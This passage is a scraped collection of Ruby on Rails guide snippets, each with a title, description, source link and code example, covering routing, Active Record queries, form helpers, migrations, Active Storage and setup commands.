false\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Form Buttons with Rails Form Builder (ERB)\nDESCRIPTION: Demonstrates how to use the new button_tag support in ActionView::Helpers::FormBuilder to create form buttons in Rails views.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_10\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_for @post do |f| %>\n  <%= f.button %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Preloading Regular Namespaced Directory\nDESCRIPTION: Configuration to preload STI models from a regular directory while maintaining namespaced class names.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/preload_stis.rb\n\nunless Rails.application.config.eager_load\n  Rails.application.config.to_prepare do\n    Rails.autoloaders.main.eager_load_dir(\"#{Rails.root}/app/models/shapes\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Opting Out of Eager Loading in Ruby on Rails\nDESCRIPTION: This snippet demonstrates how to opt-out of eager loading for a specific directory in a Rails application. It uses the Rails autoloader's do_not_eager_load method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_2\n\nLANGUAGE: Ruby\nCODE:\n```\nRails.autoloaders.main.do_not_eager_load(config.root.join(\"lib\"))\n```\n\n----------------------------------------\n\nTITLE: Setting HTTP Method for Links in Rails ERB\nDESCRIPTION: This snippet demonstrates how to use the link_to helper with data-turbo-method to specify a non-GET HTTP method for a link.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_11\n\nLANGUAGE: erb\nCODE:\n```\n<%= link_to \"Delete post\", post_path(post), data: { turbo_method: \"delete\" } %>\n```\n\n----------------------------------------\n\nTITLE: Generating Migration with References (Shell)\nDESCRIPTION: This command generates a migration to add a foreign key reference to the `products` table, linking it to the `users` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_14\n\nLANGUAGE: Shell\nCODE:\n```\n$ bin/rails generate migration AddUserRefToProducts user:references\n```\n\n----------------------------------------\n\nTITLE: Atom Feed Implementation in Rails\nDESCRIPTION: Complete example of implementing an Atom feed in Rails, including routes configuration, controller action, and builder template for XML generation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\n# config/routes.rb\nresources :articles\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/articles_controller.rb\ndef index\n  @articles = Article.all\n\n  respond_to do |format|\n    format.html\n    format.atom\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/views/articles/index.atom.builder\natom_feed do |feed|\n  feed.title(\"Articles Index\")\n  feed.updated(@articles.first.created_at)\n\n  @articles.each do |article|\n    feed.entry(article) do |entry|\n      entry.title(article.title)\n      entry.content(article.body, type: \"html\")\n\n      entry.author do |author|\n        author.name(article.author_name)\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring ActiveSupport::MessagePack as Message Serializer\nDESCRIPTION: Example of configuring ActiveSupport::MessagePack as the default message serializer in a Rails application for improved performance and reduced payload size compared to JSON and Marshal.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_support.message_serializer = :message_pack\n```\n\n----------------------------------------\n\nTITLE: Adding Confirmation to Links in Rails ERB\nDESCRIPTION: This example demonstrates how to add a confirmation dialog to a link using the data-turbo-confirm attribute in combination with data-turbo-method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_13\n\nLANGUAGE: erb\nCODE:\n```\n<%= link_to \"Delete post\", post_path(post), data: { turbo_method: \"delete\", turbo_confirm: \"Are you sure?\" } %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Timestamps in PostgreSQL\nDESCRIPTION: Shows how to configure and use timestamp fields with proper timezone handling in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20241220144913_create_devices.rb\ncreate_table :post, id: :uuid do |t|\n  t.datetime :published_at\n  # By default, Active Record will set the data type of this column to `timestamp without time zone`.\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nActiveSupport.on_load(:active_record_postgresqladapter) do\n  self.datetime_type = :timestamptz\nend\n```\n\n----------------------------------------\n\nTITLE: Constraints Block (Ruby)\nDESCRIPTION: Applies constraints to multiple routes within a block. In this example, all routes defined within the block will only match requests to the `admin` subdomain.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nconstraints subdomain: \"admin\" do\n  resources :photos\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Mailer (Rails)\nDESCRIPTION: This command generates a Rails mailer named `Product` with an `in_stock` method. It creates the mailer class and associated view templates.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_106\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails g mailer Product in_stock\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - singular_route_key (IRB)\nDESCRIPTION: Demonstrates the `singular_route_key` method of `model_name` from `ActiveModel::Naming`. It returns a string to use while generating route names.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_32\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.singular_route_key\n=> \"person\"\n```\n\n----------------------------------------\n\nTITLE: Rendering Partial with Default Local Value\nDESCRIPTION: Demonstrates rendering a partial without specifying a local variable that has a default value defined in the `locals:` signature, illustrating how the default is used.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nrender \"messages/message\"\n# => \"Hello, world!\"\n```\n\n----------------------------------------\n\nTITLE: Creating Rails Application with Prototype Instead of jQuery\nDESCRIPTION: Command to generate a new Rails 3.1 application using Prototype instead of the default jQuery JavaScript library by using the -j option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new myapp -j prototype\n```\n\n----------------------------------------\n\nTITLE: Browser Version Control in Rails Application\nDESCRIPTION: Configuration for controlling allowed browser versions in Rails 7.2+ using the allow_browser method at application level.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  # Only allow modern browsers supporting webp images, web push, badges, import maps, CSS nesting, and CSS :has.\n  allow_browser versions: :modern\nend\n```\n\n----------------------------------------\n\nTITLE: Setting a Default Value for a Local Variable\nDESCRIPTION: Shows how to set a default value for a local variable in a partial. If the variable is not passed in `locals:`, the default value will be used.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_34\n\nLANGUAGE: erb\nCODE:\n```\n<%# app/views/messages/_message.html.erb %>\n\n<%# locals: (message: \"Hello, world!\") -%>\n<%= message %>\n```\n\n----------------------------------------\n\nTITLE: Using attributes Method\nDESCRIPTION: This snippet demonstrates the `attributes` method to get a hash of attribute names and their corresponding values.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person.attributes\n=> {\"name\" => \"Jane\", \"date_of_birth\" => Wed, 01 Jan 2020, \"active\" => false}\n```\n\n----------------------------------------\n\nTITLE: Adding Foreign Key Constraint in Migration for belongs_to Association in Ruby on Rails\nDESCRIPTION: This migration snippet demonstrates how to add a foreign key constraint when setting up a belongs_to association in the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_11\n\nLANGUAGE: Ruby\nCODE:\n```\ncreate_table :books do |t|\n  t.belongs_to :author, foreign_key: true\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Registering Custom MIME Types in Rails\nDESCRIPTION: Shows how to register additional MIME types in Rails initialization. The example demonstrates registering RTF (Rich Text Format) as a supported MIME type.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nMime::Type.register(\"application/rtf\", :rtf)\n```\n\n----------------------------------------\n\nTITLE: Loading Stand-Alone Active Support Core Extensions\nDESCRIPTION: This snippet demonstrates how to load the minimum required dependencies for Active Support. It shows how to load specific extensions and grouped extensions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"active_support\"\n```\n\n----------------------------------------\n\nTITLE: SQL Query Generated by Default Scope in Rails\nDESCRIPTION: Shows an example of the SQL query generated when a default scope is applied to a model. The `WHERE` clause reflects the condition specified in the `default_scope` block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_166\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE (out_of_print = false)\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - element (IRB)\nDESCRIPTION: Demonstrates the `element` method of `model_name` from `ActiveModel::Naming`. It removes the namespace and returns the singular snake_cased name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_26\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.element\n=> \"person\"\n```\n\n----------------------------------------\n\nTITLE: Overriding Default Security Headers in Ruby on Rails\nDESCRIPTION: This snippet demonstrates how to override default security headers or add new ones in the Rails application configuration file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_65\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.default_headers[\"X-Frame-Options\"] = \"DENY\"\nconfig.action_dispatch.default_headers[\"Header-Name\"]     = \"Value\"\n```\n\n----------------------------------------\n\nTITLE: SQL Query with Default Ordering (SQL)\nDESCRIPTION: These SQL queries show the default ordering for books associated with an author based on the `year_published` column in descending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_114\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM authors WHERE id = 10 LIMIT 1\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE author_id = 10 ORDER BY year_published DESC\n```\n\n----------------------------------------\n\nTITLE: Autoloaded Rails Controller Example\nDESCRIPTION: This snippet shows a typical Rails controller where dependencies are automatically loaded without explicit require statements.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nclass PostsController < ApplicationController\n  def index\n    @posts = Post.all\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - uncountable? (IRB)\nDESCRIPTION: Demonstrates the `uncountable?` method of `model_name` from `ActiveModel::Naming`. It identifies whether the class name of a record or class is uncountable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_33\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.uncountable?\n=> false\n```\n\n----------------------------------------\n\nTITLE: Defining Author and Book Models With Associations in Ruby on Rails\nDESCRIPTION: This snippet shows how to set up a has_many and belongs_to association between Author and Book models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_4\n\nLANGUAGE: Ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, dependent: :destroy\nend\n\nclass Book < ApplicationRecord\n  belongs_to :author\nend\n```\n\n----------------------------------------\n\nTITLE: HTML output of select box with default selection\nDESCRIPTION: This HTML code shows the generated select box with 'Chicago' pre-selected.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_36\n\nLANGUAGE: html\nCODE:\n```\n<select name=\"city\" id=\"city\">\n  <option value=\"BE\">Berlin</option>\n  <option value=\"CHI\" selected=\"selected\">Chicago</option>\n  <option value=\"MD\">Madrid</option>\n</select>\n```\n\n----------------------------------------\n\nTITLE: Querying STI Records in Rails\nDESCRIPTION: Demonstrates how to query for Car records in a Single Table Inheritance setup, which will only return vehicles of type 'Car'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\nCar.all\n```\n\n----------------------------------------\n\nTITLE: Unicode Character Route in Rails\nDESCRIPTION: This code snippet shows how to define a route using Unicode characters directly in Rails. It maps the path `こんにちは` to the `welcome#index` action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\nget \"こんにちは\", to: \"welcome#index\"\n```\n\n----------------------------------------\n\nTITLE: Select Box bound to Model object in ERB\nDESCRIPTION: This ERB code demonstrates binding a select box to a `@person` model's `city` attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_39\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @person do |form| %>\n  <%= form.select :city, [[\"Berlin\", \"BE\"], [\"Chicago\", \"CHI\"], [\"Madrid\", \"MD\"]] %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Generating Add Multiple Columns Migration (Bash)\nDESCRIPTION: This command generates a migration to add 'part_number' (string) and 'price' (decimal) columns to the 'products' table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration AddDetailsToProducts part_number:string price:decimal\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - route_key (IRB)\nDESCRIPTION: Demonstrates the `route_key` method of `model_name` from `ActiveModel::Naming`. It returns a string to use while generating route names.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_31\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.route_key\n=> \"people\"\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - collection (IRB)\nDESCRIPTION: Demonstrates the `collection` method of `model_name` from `ActiveModel::Naming`.  It removes the namespace and returns the plural snake_cased name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_28\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.collection\n=> \"people\"\n```\n\n----------------------------------------\n\nTITLE: Expanded resources definition\nDESCRIPTION: This snippet shows the expanded version of defining routes for multiple resources. This is equivalent to calling the resources method for each resource independently.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos\nresources :books\nresources :videos\n```\n\n----------------------------------------\n\nTITLE: Limit and Offset Records in Rails\nDESCRIPTION: Shows how to combine `limit` and `offset` to paginate results, retrieving a subset of records starting from a specific offset.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_91\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.limit(5).offset(30)\n```\n\n----------------------------------------\n\nTITLE: Generating User Scaffold in Rails\nDESCRIPTION: Command to generate a user scaffold with name, email, and login fields, followed by database migration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold user name email login\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Using Custom Zeitwerk Inflector\nDESCRIPTION: Configuration for using a custom Zeitwerk inflector with complete control over inflections.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nRails.autoloaders.each do |autoloader|\n  autoloader.inflector = Zeitwerk::Inflector.new\n  autoloader.inflector.inflect(\n    \"html_parser\" => \"HTMLParser\",\n    \"ssl_error\"   => \"SSLError\"\n  )\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Download Link for Attachment in Rails\nDESCRIPTION: Demonstrates creating a download link for an attachment using the rails_blob_path helper with a disposition parameter set to 'attachment' to force download behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nrails_blob_path(user.avatar, disposition: \"attachment\")\n```\n\n----------------------------------------\n\nTITLE: Pluralizing Words with pluralize in Ruby\nDESCRIPTION: Shows how to use the pluralize helper to return the singular or plural form of a word based on a number.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\npluralize(1, \"person\") # => 1 person\npluralize(2, \"person\") # => 2 people\npluralize(3, \"person\", plural: \"users\") # => 3 users\n```\n\n----------------------------------------\n\nTITLE: Configuring Direct and Resolved Routes in Rails\nDESCRIPTION: Shows how to use the new resolve and direct routing methods to customize polymorphic mapping and create custom URL helpers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nresource :basket\n\nresolve(\"Basket\") { [:basket] }\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndirect(:homepage) { \"https://rubyonrails.org\" }\n\ndirect :commentable do |model|\n  [ model, anchor: model.dom_id ]\nend\n\ndirect :main do\n  { controller: 'pages', action: 'index', subdomain: 'www' }\nend\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Collection Checkboxes\nDESCRIPTION: This HTML output shows the generated checkboxes for Engineering, Math, Science, and Technology, created using the `collection_checkboxes` helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_57\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"checkbox\" name=\"person[interest_id][]\" value=\"3\" id=\"person_interest_id_3\">\n<label for=\"person_interest_id_3\">Engineering</label>\n\n<input type=\"checkbox\" name=\"person[interest_id][]\" value=\"4\" id=\"person_interest_id_4\">\n<label for=\"person_interest_id_4\">Math</label>\n\n<input type=\"checkbox\" name=\"person[interest_id][]\" value=\"1\" id=\"person_interest_id_1\">\n<label for=\"person_interest_id_1\">Science</label>\n\n<input type=\"checkbox\" name=\"person[interest_id][]\" value=\"2\" id=\"person_interest_id_2\">\n<label for=\"person_interest_id_2\">Technology</label>\n```\n\n----------------------------------------\n\nTITLE: Running Rails Tests\nDESCRIPTION: This snippet shows the command to run the Rails tests, which includes the ActiveModel::Lint::Tests. This command executes the test suite and reports the results, including the number of runs, assertions, failures, errors, and skips.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_39\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test\n```\n\n----------------------------------------\n\nTITLE: Installing Ruby Prerequisites and Mise on macOS (bash)\nDESCRIPTION: Installs Xcode Command Line Tools, Homebrew, necessary dependencies (openssl, libyaml, gmp, rust), the Mise version manager, configures the shell environment for Mise, and installs Ruby version 3 globally using Mise. Requires macOS Catalina 10.15 or newer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/install_ruby_on_rails.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n# Install Xcode Command Line Tools\n$ xcode-select --install\n\n# Install Homebrew and dependencies\n$ /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n$ echo 'export PATH=\"/opt/homebrew/bin:$PATH\"' >> ~/.zshrc\n$ source ~/.zshrc\n$ brew install openssl@3 libyaml gmp rust\n\n# Install Mise version manager\n$ curl https://mise.run | sh\n$ echo 'eval \"$(~/.local/bin/mise activate)\"' >> ~/.zshrc\n$ source ~/.zshrc\n\n# Install Ruby globally with Mise\n$ mise use -g ruby@3\n```\n\n----------------------------------------\n\nTITLE: Retrieving the last record in Rails\nDESCRIPTION: This code demonstrates how to retrieve the last record from the `Customer` model using the `last` method. It fetches the record ordered by the primary key in descending order. The `last` method returns `nil` if no record is found.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_26\n\nLANGUAGE: irb\nCODE:\n```\nirb> customer = Customer.last\n=> #<Customer id: 221, first_name: \"Russel\">\n```\n\n----------------------------------------\n\nTITLE: Creating a testing branch in Git for reviewing pull requests\nDESCRIPTION: Command to create a dedicated branch in Git for testing a pull request submitted to Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ git checkout -b testing_branch\n```\n\n----------------------------------------\n\nTITLE: Generating Rails Model Test Bash\nDESCRIPTION: Demonstrates how to generate a model test skeleton using the Rails generator. This command creates a basic test file in the `test/models` directory for the specified model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_35\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate test_unit:model article\n```\n\n----------------------------------------\n\nTITLE: Retrieving the first record with composite primary key\nDESCRIPTION: This code shows how to retrieve the first record when the model has a composite primary key. The records are ordered by the composite primary key columns in ascending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_22\n\nLANGUAGE: irb\nCODE:\n```\nirb> customer = Customer.first\n=> #<Customer id: 2, store_id: 1, first_name: \"Lifo\">\n```\n\n----------------------------------------\n\nTITLE: Database Command Configuration in Rails\nDESCRIPTION: Configuration changes for database commands including mysqldump and psql flags for better error handling and output control.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\n\"-v ON_ERROR_STOP=1\"\n```\n\n----------------------------------------\n\nTITLE: Multiple Wildcard Segments (Ruby)\nDESCRIPTION: Defines a route with multiple wildcard segments (`*a` and `*b`). Segments are assigned to parameters in the order they appear in the route.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\nget \"*a/foo/*b\", to: \"test#index\"\n```\n\n----------------------------------------\n\nTITLE: Indent String\nDESCRIPTION: This snippet demonstrates indenting lines in a string by a specified number of spaces. It uses the `indent` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\n<<EOS.indent(2)\ndef some_method\n  some_code\nend\nEOS\n# =>\n  def some_method\n    some_code\n  end\n```\n\n----------------------------------------\n\nTITLE: Head Request Example (Rails/Ruby)\nDESCRIPTION: This example demonstrates how to use the `head` method to send a response with only HTTP headers, specifically a 'bad_request' error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nhead :bad_request\n```\n\n----------------------------------------\n\nTITLE: Running Rails Commands with rails_command\nDESCRIPTION: Demonstrates how to run a Rails command within the application using the `rails_command` method.  Examples shows running migrations, setting the environment and running with sudo.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nrails_command \"db:migrate\"\n\nrails_command \"db:migrate\", env: \"production\"\n\nrails_command \"log:clear\", sudo: true\n\nrails_command \"db:migrate\", abort_on_failure: true\n```\n\n----------------------------------------\n\nTITLE: Environment Variable Configuration\nDESCRIPTION: Configuration option for logging to STDOUT in production environment using an environment variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_0_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nRAILS_LOG_TO_STDOUT=true\n```\n\n----------------------------------------\n\nTITLE: SQL Query for Joining Tables with Raw SQL (SQL)\nDESCRIPTION: This SQL query is the result of the previous Ruby code snippet, showing the `INNER JOIN` clause specified using raw SQL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_138\n\nLANGUAGE: sql\nCODE:\n```\nSELECT authors.* FROM authors INNER JOIN books ON books.author_id = authors.id AND books.out_of_print = FALSE\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Limit and Offset in Rails\nDESCRIPTION: This SQL query shows the usage of both `LIMIT` and `OFFSET` clauses to select a specific range of records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_92\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers LIMIT 5 OFFSET 30\n```\n\n----------------------------------------\n\nTITLE: Configuring Case-Insensitive Encryption in Rails Models\nDESCRIPTION: Demonstrates how to configure case-insensitive encryption for model attributes using the :downcase and :ignore_case options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  encrypts :email_address, deterministic: true, downcase: true\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass Label\n  encrypts :name, deterministic: true, ignore_case: true # the content with the original case will be stored in the column `original_name`\nend\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Grouping in Rails\nDESCRIPTION: SQL generated by the `group` method, showcasing the `GROUP BY` clause used to group records based on the `created_at` column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_94\n\nLANGUAGE: sql\nCODE:\n```\nSELECT created_at\nFROM orders\nGROUP BY created_at\n```\n\n----------------------------------------\n\nTITLE: Checking if a Message Has Attached Images in Rails\nDESCRIPTION: Demonstrates how to check whether a message has any attached images using the images.attached? method, which returns a boolean value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\n@message.images.attached?\n```\n\n----------------------------------------\n\nTITLE: Active Storage Model Association - Ruby\nDESCRIPTION: This Ruby code snippet defines an `Article` model with an `ActiveStorage` attachment named `thumbnail` using the `has_one_attached` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nclass Article < ApplicationRecord\n  has_one_attached :thumbnail\nend\n```\n\n----------------------------------------\n\nTITLE: Regrouping Conditions with Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how to use the `regroup` method to override an existing, named `group` condition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_125\n\nLANGUAGE: ruby\nCODE:\n```\nBook.group(:author).regroup(:id)\n```\n\n----------------------------------------\n\nTITLE: Finding Objects in a Has and Belongs to Many Collection in Rails\nDESCRIPTION: Example of using the find method to locate a specific assembly by ID within a part's collection of assemblies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\n@assembly = @part.assemblies.find(1)\n```\n\n----------------------------------------\n\nTITLE: Nested JavaScript Includes (Rails/ERB)\nDESCRIPTION: This example shows how to include JavaScript files within a nested directory (photos/columns.js) using the `javascript_include_tag` helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_45\n\nLANGUAGE: erb\nCODE:\n```\n<%= javascript_include_tag \"main\", \"/photos/columns\" %>\n```\n\n----------------------------------------\n\nTITLE: Running Tests with Line Range - Rails\nDESCRIPTION: This command illustrates how to run a range of tests by specifying a line range within a test file using the Rails test runner.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_20\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test test/models/article_test.rb:6-20 # runs tests from line 6 to 20\n```\n\n----------------------------------------\n\nTITLE: Adding Sprockets Rails Dependency\nDESCRIPTION: Shows how to add the now-optional Sprockets dependency to a Rails application's Gemfile since it's no longer included by default in Rails 7.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_0_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"sprockets-rails\"\n```\n\n----------------------------------------\n\nTITLE: Reversing Order in Active Record (Ruby)\nDESCRIPTION: This snippet shows how to use the `reverse_order` method to reverse the ordering clause if one is specified.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_117\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"author_id > 10\").order(:year_published).reverse_order\n```\n\n----------------------------------------\n\nTITLE: Requiring a Local Variable\nDESCRIPTION: Demonstrates how to make a local variable required in a partial. Attempting to render the partial without the required variable will raise an exception.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_32\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/messages/_message.html.erb %>\n\n<%# locals: (message:) -%>\n<%= message %>\n```\n\n----------------------------------------\n\nTITLE: HTML Script Tag (Rails/HTML)\nDESCRIPTION: This example shows the HTML output of the previous JavaScript include tag example. It links to the `main.js` file in the assets directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_43\n\nLANGUAGE: html\nCODE:\n```\n<script src='/assets/main.js'></script>\n```\n\n----------------------------------------\n\nTITLE: Running Rails Console in Docker\nDESCRIPTION: Command for starting a Rails console within the Docker container, allowing interactive access to the application's environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ docker run --rm -it -v 